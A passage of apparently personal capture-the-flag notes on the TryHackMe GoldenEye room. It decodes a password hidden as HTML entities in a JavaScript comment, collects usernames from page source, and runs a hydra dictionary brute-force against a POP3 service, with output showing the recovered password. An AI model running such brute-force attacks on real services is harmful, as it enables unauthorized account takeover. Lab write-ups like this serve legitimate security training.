#   Tryhackme - GoldenEye
##  IP=10.10.147.127

##  Notes
- From the terminal.js file source:

```
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```
- Getting out the imp things:
```
 73 110 118 105 110 99 105 98 108 101 72 97 99 107 51 114
 Unicode Decimal encoded.

 User: Boris
 Pass: InvincibleHack3r
```

-  From `view-source:http://10.10.147.127/sev-home/`: 

```
Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
```

-   Cracking pop3
```
┌──(subhro1530㉿subhro)-[~]
└─$ hydra -l boris -P Documents/fasttrack.txt -t20 10.10.147.127 -s55007 -I pop3 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-04 05:34:17
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 20 tasks per 1 server, overall 20 tasks, 222 login tries (l:1/p:222), ~12 tries per task
[DATA] attacking pop3://10.10.147.127:55007/
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 122 to do in 00:02h, 20 active
[STATUS] 80.00 tries/min, 160 tries in 00:02h, 62 to do in 00:01h, 20 active
[55007][pop3] host: 10.10.147.127   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-04 05:36:27

```